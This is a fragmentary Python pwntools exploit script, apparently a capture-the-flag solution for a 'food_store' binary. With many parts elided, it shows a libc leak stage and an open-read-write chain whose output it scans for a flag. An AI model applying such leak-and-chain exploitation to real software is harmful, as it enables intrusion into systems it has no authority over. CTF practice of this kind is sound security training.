#!/usr/bin/env python3
"""
food_store exploit – fully synchronous, robust version.
"""
...
libc = ELF(str(pick_existing("libc.so.6", "libc-4e5dfd832191073e18a09728f68666b6465eeacd.so")), checksec=False)
...
def cook(name, show=False):
    mc(5)
    banner = p.recvuntil(b"What do you want to cook :", timeout=10)
...
log.info(f"[{_time.time()-T0:.1f}s] Stage 2: libc leak")
...
# ORW chain writes to stdout(1) — drain the socket before close
flag_data = b""
for _ in range(30):
    try:
        d = p.recv(timeout=2)
...
if flag_data:
    ...
    for line in flag_data.split(b'\n'):
        if b'flag{' in line.lower():
            log.success(f"FLAG: {line.decode()}")
else:
    log.warn("No data received after trigger — may need interactive mode")
